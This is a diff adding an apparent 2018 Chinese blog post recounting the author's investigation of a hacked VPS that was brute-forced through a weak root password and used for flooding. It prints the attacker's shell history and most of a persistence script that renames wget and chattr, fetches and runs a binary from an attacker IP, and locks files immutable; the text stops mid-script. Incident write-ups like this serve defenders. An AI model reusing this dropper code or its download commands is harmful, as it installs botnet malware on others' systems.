@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>服务器被黑之后的心路历程 | To change is to be better to change often is to change perfect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="VPS运营爆破端口firewalld脚本小子" />
+  
+  
+    <meta name="google-site-verification" content="zeeMq378QFdIk20wn4KhRFwp7IhLaosjf7Kf7o9Zcfs" />
+  
+  
+  
+  <meta name="description" content="&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x9ED1;&amp;#x4E4B;&amp;#x540E;&amp;#x7684;&amp;#x5FC3;&amp;#x8DEF;&amp;#x5386;&amp;#x7A0B; &amp;#x4E0D;&amp;#x4E45;&amp;#x524D;&amp;#x8BFB;&amp;#x4E86;&amp;#x4E00;&amp;#x7BC7;&amp;#x9ED1;&amp;#x5BA2;&amp;#x6545;&amp;#x4E8B;&amp;#xFF08; &amp;#x9AD">
+<meta name="keywords" content="VPS,运营,爆破端口,firewalld,脚本小子">
+<meta property="og:type" content="article">
+<meta property="og:title" content="服务器被黑之后的心路历程">
+<meta property="og:url" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/index.html">
+<meta property="og:site_name" content="To change is to be better to change often is to change perfect">
+<meta property="og:description" content="&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x9ED1;&amp;#x4E4B;&amp;#x540E;&amp;#x7684;&amp;#x5FC3;&amp;#x8DEF;&amp;#x5386;&amp;#x7A0B; &amp;#x4E0D;&amp;#x4E45;&amp;#x524D;&amp;#x8BFB;&amp;#x4E86;&amp;#x4E00;&amp;#x7BC7;&amp;#x9ED1;&amp;#x5BA2;&amp;#x6545;&amp;#x4E8B;&amp;#xFF08; &amp;#x9AD">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/2.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/7.jpg">
+<meta property="og:updated_time" content="2020-11-25T12:52:29.040Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="服务器被黑之后的心路历程">
+<meta name="twitter:description" content="&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x9ED1;&amp;#x4E4B;&amp;#x540E;&amp;#x7684;&amp;#x5FC3;&amp;#x8DEF;&amp;#x5386;&amp;#x7A0B; &amp;#x4E0D;&amp;#x4E45;&amp;#x524D;&amp;#x8BFB;&amp;#x4E86;&amp;#x4E00;&amp;#x7BC7;&amp;#x9ED1;&amp;#x5BA2;&amp;#x6545;&amp;#x4E8B;&amp;#xFF08; &amp;#x9AD">
+<meta name="twitter:image" content="http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/1.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="To change is to be better to change often is to change perfect" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        
+
+<header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Startseite</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archive</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">about themes</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/book">📓</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Schreib etwas..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Beiträge',
+            PAGES: 'Seiten',
+            CATEGORIES: 'Kategorien',
+            TAGS: 'Tags',
+            UNTITLED: '(Unbenannt)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-服务器被黑之后的心路历程" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      服务器被黑之后的心路历程
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/03/30/服务器被黑之后的心路历程/" class="article-date">
+	  <time datetime="2018-03-30T06:59:34.000Z" itemprop="datePublished">2018-03-30</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;</p>
+<p>&#x4E0D;&#x4E45;&#x524D;&#x8BFB;&#x4E86;&#x4E00;&#x7BC7;&#x9ED1;&#x5BA2;&#x6545;&#x4E8B;&#xFF08; &#x9AD8;&#x624B;&#x5BF9;&#x51B3; &#x2013; &#x535A;&#x5BA2;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x7684;&#x6545;&#x4E8B;&#xFF09;&#xFF0C;&#x8BFB;&#x5B8C;&#x6B64;&#x6587;&#x540E;&#xFF0C;&#x624D;&#x610F;&#x8BC6;&#x5230;&#x6211;&#x7684;&#x673A;&#x5668;&#x662F;&#x5904;&#x4E8E;&#x88F8;&#x5954;&#x72B6;&#x6001;&#xFF0C;&#x4FBF;&#x9976;&#x6709;&#x5174;&#x81F4;&#x5730;&#x53BB;&#x670D;&#x52A1;&#x5668;&#x68C0;&#x67E5;&#x4E86;&#x4E00;&#x4E0B;&#x65E5;&#x5FD7;&#x3002;&#x53D1;&#x73B0;&#x8FD8;&#x771F;&#x6709;&#x4EBA;&#x5728;&#x5C1D;&#x8BD5;&#x5BF9;&#x6211;&#x7684;&#x673A;&#x5668;&#x8FDB;&#x884C;&#x66B4;&#x529B;&#x7834;&#x89E3;&#xFF08;&#x4E00;&#x4E0B;&#x7B80;&#x79F0;&#x7206;&#x7834;&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x653B;&#x52BF;&#x8FD8;&#x633A;&#x731B;&#xFF0C;&#x5F53;&#x5929;&#x5C31;&#x6709;1w+&#x7684;&#x66B4;&#x529B;&#x5C1D;&#x8BD5;&#xFF01;&#x4F46;&#x662F;&#x5F53;&#x65F6;&#x5E76;&#x6CA1;&#x6709;&#x7279;&#x522B;&#x53BB;&#x5728;&#x610F;&#xFF0C;&#x88AB;&#x9ED1;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#x5E94;&#x8BE5;&#x4E0D;&#x4F1A;&#x53D1;&#x751F;&#x7684;&#x2026;&#x2026;&#x5427;&#x2026;&#x2026;</p>
+<p>&#x53EA;&#x662F;&#xFF0C;&#x51E0;&#x5929;&#x4E4B;&#x540E;&#x7684;&#x67D0;&#x4E00;&#x5929;&#xFF08;2&#x6708;3&#x53F7;&#xFF09;&#x6DF1;&#x591C;&#xFF0C;&#x8DB4;&#x5728;&#x5E8A;&#x4E0A;&#x4F11;&#x95F2;&#x7684;&#x770B;&#x90AE;&#x4EF6;&#x65F6;&#xFF0C;&#x6536;&#x5230;&#x4E86;DO&#x5728;1&#x6708;29&#x53F7;&#x53D1;&#x7684;&#x8B66;&#x544A;&#x90AE;&#x4EF6;&#xFF08;DO&#xFF1A;Digital Ocean, &#x4E00;&#x4E2A;vps&#x4E3B;&#x673A;&#x63D0;&#x4F9B;&#x5546;&#xFF0C;&#x8FD9;&#x4E2A;&#x535A;&#x5BA2;&#x5C31;&#x662F;&#x67B6;&#x8BBE;&#x5728;&#x6211;&#x5728;DO&#x7684;vps&#x4E0A;&#xFF09;&#xFF1A;</p>
+<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
+<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved&#x2026;</p>
+<p>&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#xFF01;&#x6211;&#x7684;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E86;&#xFF01;&#xFF01;&#xFF1F;DO&#x628A;&#x6211;&#x7684;&#x670D;&#x52A1;&#x5C01;&#x4E86;&#xFF01;&#xFF01;&#xFF1F;&#x7ACB;&#x9A6C;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;&#x6211;&#x7684;&#x535A;&#x5BA2;&#x4E3B;&#x9875;&#xFF0C;&#x679C;&#x7136;&#x6302;&#x4E86;&#x3002;&#x7136;&#x540E;&#x5C1D;&#x8BD5;ssh&#x767B;&#x5F55;&#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x8FDE;&#x63A5;&#x4E0D;&#x4E0A;&#xFF0C;&#x679C;&#x7136;&#x4E3B;&#x673A;&#x88AB;&#x5C01;&#x4E86;&#xFF01;&#x800C;&#x4E14;&#x8FD9;&#x90AE;&#x4EF6;&#x662F;&#x4E94;&#x5929;&#x524D;&#x53D1;&#x7684;&#xFF0C;&#x6211;&#x73B0;&#x5728;&#x624D;&#x77E5;&#x9053;&#xFF01;&#x5413;&#x5F97;&#x5F53;&#x65F6;&#x6211;&#x7684;&#x8868;&#x60C5;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>
+<img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/1.jpg">
+<p>&#x5BFB;&#x627E;&#x7EBF;&#x7D22;<br>&#x7B2C;&#x4E8C;&#x5929;&#x8D77;&#x5E8A;&#x4E4B;&#x540E;&#xFF0C;&#x7ACB;&#x9A6C;&#x8DD1;&#x5230;&#x81EA;&#x4E60;&#x5BA4;&#x8FDB;&#x5165;&#x5FD8;&#x6211;&#x6A21;&#x5F0F;&#xFF0C;&#x5F00;&#x59CB;&#x8FFD;&#x67E5;&#x539F;&#x56E0;&#xFF01;</p>
+<p>&#x670D;&#x52A1;&#x5668;&#x7F51;&#x7EDC;&#x88AB;&#x7981;&#xFF0C;&#x6CA1;&#x6CD5;ssh&#x767B;&#x5F55;&#x3002;&#x5E78;&#x597D;&#xFF0C; DO &#x63D0;&#x4F9B;&#x4E86;Web console&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Web&#x754C;&#x9762;&#x6765;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x3002;</p>
+<p>&#x201C;DO&#x628A;&#x6211;&#x670D;&#x7F51;&#x7EDC;&#x5C01;&#x7981;&#x4E86;&#xFF0C;&#x90A3;&#x8D3C;&#x73B0;&#x5728;&#x5E94;&#x8BE5;&#x65E0;&#x6CD5;&#x63A7;&#x5236;&#x6211;&#x7684;&#x670D;&#x52A1;&#x5668;&#x201D;&#xFF0C;&#x5FC3;&#x91CC;&#x518D;&#x4E00;&#x6B21;&#x6697;&#x60F3;&#x7740;&#xFF0C;&#x201C;&#x73B0;&#x5728;&#x6682;&#x65F6;&#x65E0;&#x9700;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x6765;&#x9632;&#x6B62;&#x4E3B;&#x673A;&#x88AB;&#x518D;&#x6B21;&#x63A7;&#x5236;&#xFF0C;&#x5148;&#x5148;&#x627E;&#x51FA;&#x95EE;&#x9898;&#x6240;&#x5728;&#x5427;&#x3002;&#x201D;</p>
+<p>&#x518D;&#x6B21;&#x6253;&#x5F00;&#x90AE;&#x4EF6;&#xFF0C;&#x89C2;&#x5BDF;DO&#x63D0;&#x4F9B;&#x7684;&#x62A5;&#x8B66;&#x4FE1;&#x606F;&#xFF1A;</p>
+<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
+<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved&#x2026;</p>
+<p>&#x201C;&#x96BE;&#x9053;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x52AB;&#x6301;&#x4F5C;&#x4E3A;&#x8089;&#x9E21;&#x6765;&#x653B;&#x51FB;&#x5176;&#x5B83;&#x7684;&#x7F51;&#x7EDC;&#x4E86;&#xFF01;&#xFF1F;&#x201D;&#xFF0C;&#x90A3;&#x662F;&#x4E00;&#x5934;&#x96FE;&#x6C34;&#x554A;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x6E05;&#x695A;&#x653B;&#x51FB;&#x8005;&#x7A76;&#x7ADF;&#x5229;&#x7528;&#x6211;&#x670D;&#x505A;&#x4E86;&#x4EC0;&#x4E48;&#x4E8B;&#x60C5;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x597D;&#x50CF;&#x662F;&#x88AB;&#x5F53;&#x8089;&#x9E21;&#x4E86;&#x54CE; &#x256E;(&#x256F;&#x25BD;&#x2570;)&#x256D;&#x3002;</p>
+<p>&#x6240;&#x4EE5;&#x63A5;&#x4E0B;&#x6765;&#x7406;&#x6240;&#x5F53;&#x7136;&#x7684;&#x53BB;&#x67E5;&#x770B;&#x6709;&#x95EE;&#x9898;&#x7684;&#x8FDB;&#x7A0B;&#x4E86;&#x3002;</p>
+<p>&#x65E2;&#x7136;&#x662F;traffic flood&#xFF0C;&#x90A3;&#x5C31;&#x5148;&#x4ECE;&#x7F51;&#x7EDC;&#x68C0;&#x67E5;&#x8D77;&#x3002;</p>
+<p>$ sudo ss -p<br>State       Recv-Q Send-Q   Local Address:Port       Peer Address:Port<br>SYN-SENT    0      4            127.0.0.1:36512      183.60.149.202:43200<br>users:((&#x201C;icnanker&#x201D;,14519,4))<br>&#x2026;<br>&#x4E0D;&#x51FA;&#x6240;&#x6599;&#x679C;&#x7136;&#x770B;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x53EF;&#x7591;&#x7684;&#x7A0B;&#x5E8F;&#xFF1A;icnanker&#xFF0C;&#x5B83;&#x5728;&#x4E0D;&#x505C;&#x7684;&#x5C1D;&#x8BD5;&#x5F80;183.60.149.202:43200&#x53D1;&#x9001;tcp syn&#x5305;&#xFF01;&#x7ACB;&#x9A6C;&#x641C;&#x8FD9;&#x4E2A;IP&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x53EA;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E1C;&#x839E;&#x7684;&#x4E00;&#x4E2A;IP&#x3002;&#x90A3;&#x7EE7;&#x7EED;&#x5427;&#xFF0C;&#x5148;&#x627E;&#x51FA;&#x6240;&#x6709;&#x6709;&#x95EE;&#x9898;&#x7684;&#x8FDB;&#x7A0B;&#x518D;&#x8BF4;&#x3002;</p>
+<p>&#x679C;&#x7136;&#x5728;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#x4E2D;&#x627E;&#x5230;&#x4E86;&#x4E09;&#x4E2A;&#x5F88;&#x53EF;&#x7591;&#x7684;&#x8FDB;&#x7A0B;&#xFF1A;</p>
+<p>$ ps aux<br>(&#x2026;)<br>root     13648  0.0  0.1 23656   556 ?        Ss    Jan28   0:43 /etc/init.d/apache2.sh<br>root     14519  0.0  0.2 85872  1208 ?        S     Jan28   23:41 /usr/bin/icnanker<br>root     26595  0.0  0.2 61364  1224 ?        S     Jan28   0:00 /usr/bin/.sshd<br>(&#x2026;)<br>&#x7B2C;&#x4E00;&#xFF0C;&#x6211;&#x6CA1;&#x6709;&#x88C5;apache&#xFF0C;apache2.sh&#x8FD9;&#x6837;&#x7684;&#x540D;&#x5B57;&#x5B9E;&#x5728;&#x662F;&#x592A;&#x53EF;&#x7591;&#x4E86;&#x3002;</p>
+<p>&#x7B2C;&#x4E8C;&#xFF0C;.sshd&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x540D;&#x5B57;&#x66F4;&#x53EF;&#x7591;&#xFF0C;sshd&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x662F;sshd&#xFF0C;&#x4F2A;&#x88C5;&#x5F97;&#x592A;&#x4E0D;&#x50CF;&#x4E86;&#x3002;</p>
+<p>&#x7B2C;&#x4E09;&#xFF0C;&#x53EA;&#x6709;&#x8FD9;&#x4E09;&#x4E2A;&#x8FDB;&#x7A0B;&#x90FD;&#x662F;&#x5728;Jan28&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;1&#x6708;28&#x53F7;&#xFF0C;&#x8FD9;&#x8BA9;&#x6211;&#x8054;&#x60F3;&#x5230;29&#x53F7;&#x9020;&#x6210;&#x7684;traffic flood&#x3002;&#x80AF;&#x5B9A;&#x6709;&#x95EE;&#x9898;&#x3002;</p>
+<p>&#x63A5;&#x7740;&#x4E0B;&#x610F;&#x8BC6;&#x7684;&#x53BB;&#x7FFB;&#x9605;&#x767B;&#x5F55;&#x65E5;&#x5FD7;&#xFF1A;</p>
+<h1 id="grep-&#x201C;Accepted&#x201D;-var-log-auth-log-1"><a href="#grep-&#x201C;Accepted&#x201D;-var-log-auth-log-1" class="headerlink" title="grep &#x201C;Accepted&#x201D; /var/log/auth.log.1"></a>grep &#x201C;Accepted&#x201D; /var/log/auth.log.1</h1><p>(&#x2026;)<br>Jan 26 16:55:49 mon sshd[13955]: Accepted password for root from 61.160.247.8 port 1604 ssh2<br>Jan 28 17:12:03 mon sshd[30407]: Accepted password for root from 61.166.50.23 port 3343 ssh2<br>(&#x2026;)</p>
+<h1 id="grep-&#x201C;Jan-2-5-8-sshd-Failed&#x201D;-var-log-auth-log-1-wc"><a href="#grep-&#x201C;Jan-2-5-8-sshd-Failed&#x201D;-var-log-auth-log-1-wc" class="headerlink" title="grep &#x201C;Jan 2[5-8] .sshd.Failed&#x201D; /var/log/auth.log.1 | wc"></a>grep &#x201C;Jan 2[5-8] .<em>sshd.</em>Failed&#x201D; /var/log/auth.log.1 | wc</h1><p>  21806  355851 2333557<br>&#xFF01;&#xFF01;&#xFF01;&#xFF01;</p>
+<p>Jan 26&#x548C; Jan 28&#x90FD;&#x6709;&#x4EBA;&#x5728;&#x6211;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x767B;&#x5F55;&#x8FC7;root&#x8D26;&#x53F7;&#xFF01;Ip&#x6765;&#x6E90;&#x53D1;&#x73B0;&#x5206;&#x522B;&#x662F;&#x4E91;&#x5357;&#x548C;&#x6C5F;&#x82CF;&#x7684;&#xFF0C;&#x4E5F;&#x662F;&#x975E;&#x5E38;&#x8BE1;&#x5F02;&#x3002;&#x63A5;&#x7740;&#x8BA9;&#x6211;&#x66F4;&#x5403;&#x60CA;&#x7684;&#x662F;&#x4ECE;Jan 25&#x5230;Feb 28&#xFF0C;&#x5171;&#x6709;2w+&#x7684;&#x66B4;&#x7834;&#x5C1D;&#x8BD5;&#xFF01;</p>
+<p>&#x5728;&#x770B;&#x5230;&#x8FD9;&#x4E9B;&#x7ED3;&#x679C;&#x7684;&#x77AC;&#x95F4;&#x5176;&#x5B9E;&#x6211;&#x5C31;&#x660E;&#x767D;&#x4E86;&#x4E3A;&#x4F55;&#x6211;&#x4F1A;&#x88AB;&#x653B;&#x7834;&#x2014;&#x2014;&#x56E0;&#x4E3A;&#x6211;&#x7684;&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x5F97;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x7B80;&#x5355;&#x5230;&#x548C;&#x201C;123456&#x201D;&#x8FD9;&#x6837;&#x7684;&#x5BC6;&#x7801;&#x5DEE;&#x4E0D;&#x591A;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7684;&#x8868;&#x60C5;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br><img src="/2018/03/30/&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E4B;&#x540E;&#x7684;&#x5FC3;&#x8DEF;&#x5386;&#x7A0B;/2.jpg"></p>
+<p>&#x7ACB;&#x9A6C;&#x5207;&#x6362;&#x5230;root&#x7528;&#x6237;&#xFF0C;&#x67E5;&#x770B;root&#x547D;&#x4EE4;&#x8BB0;&#x5F55;&#xFF0C;&#x770B;&#x770B;&#x80FD;&#x4E0D;&#x80FD;&#x8FFD;&#x8E2A;&#x5230;&#x8FD9;&#x4E2A;&#x5BB6;&#x4F19;&#x5728;&#x6211;&#x673A;&#x5668;&#x4E0A;&#x505A;&#x8FC7;&#x4EC0;&#x4E48;&#xFF0C;&#x540C;&#x65F6;&#x5728;&#x5FC3;&#x91CC;&#x50CF;&#x4E0A;&#x5E1D;&#x7948;&#x7977;&#x5E0C;&#x671B;&#x4ED6;&#x6CA1;&#x64E6;&#x53BB;&#x811A;&#x5370;&#x3002;</p>
+<h1 id="history"><a href="#history" class="headerlink" title="history"></a>history</h1><p>(&#x2026;)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>   10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>   11  chmod 0755 /etc/init.d/apache2.sh<br>   12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>   13  lockr +i /etc/init.d/apache2.sh<br>   14  vi /etc/rc.local<br>   15  lockr +i /etc/rc.local<br>   16  less /etc/init.d/apache2.sh<br>&#x611F;&#x6168;&#x4E07;&#x5343;&#xFF0C;&#x4E07;&#x5343;&#x611F;&#x6168;&#xFF0C;&#x201C;&#x8FD8;&#x597D;&#xFF0C;&#x8FD9;&#x4E2A;&#x50BB;&#x903C;&#x6CA1;&#x6709;&#x64E6;&#x53BB;&#x811A;&#x5370;&#x201D;&#xFF0C;&#x54C8;&#x54C8;&#x54C8;&#x54C8;&#x54C8;&#x3002;&#x3002;</p>
+<p>&#x505A;&#x62B1;&#x62F3;&#x72B6;&#xFF0C;&#x7AD9;&#x8D77;&#xFF0C;&#x51FA;&#x81EA;&#x4E60;&#x5BA4;&#xFF0C;&#x63A5;&#x5F00;&#x6C34;&#xFF0C;&#x56DE;&#x6765;&#xFF0C;&#x7EE7;&#x7EED;&#xFF01;</p>
+<p>&#x201C;&#x6211;&#x9700;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x8FD9;&#x5BB6;&#x4F19;&#x7A76;&#x7ADF;&#x5BF9;&#x6211;&#x7684;&#x673A;&#x5668;&#x5E72;&#x4E86;&#x4E9B;&#x4EC0;&#x4E48;&#xFF01;&#x201D;</p>
+<p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x8BB0;&#x5F55;&#x6765;&#x770B;&#xFF0C;/etc/init.d/apache2.sh&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x6709;&#x5F88;&#x5927;&#x7684;&#x5ACC;&#x7591;&#xFF0C;&#x67E5;&#x770B;&#x811A;&#x672C;&#x5185;&#x5BB9;&#xFF1A;</p>
+<h1 id="cat-etc-init-d-apache2-sh"><a href="#cat-etc-init-d-apache2-sh" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=&#x201D;/usr/bin/vget&#x201D;<br>Lok=&#x201D;/usr/bin/lockr&#x201D;<br>Bak=&#x201D;/usr/bin/.filebak&#x201D;<br>hosts=&#x201D;/etc/hosts.bak&#x201D;<br>File=&#x201D;/usr/bin/icnanker&#x201D;<br>if [ ! -f  &#x201C;$hosts&#x201D; ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  &#x201C;$Lok&#x201D; ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  &#x201C;$Get&#x201D; ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z &#x201C;$Exist&#x201D; ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  &#x201C;$File&#x201D; ];then<br>        if [ ! -f  &#x201C;$Bak&#x201D; ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  &#x201C;$Bak&#x201D; ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i 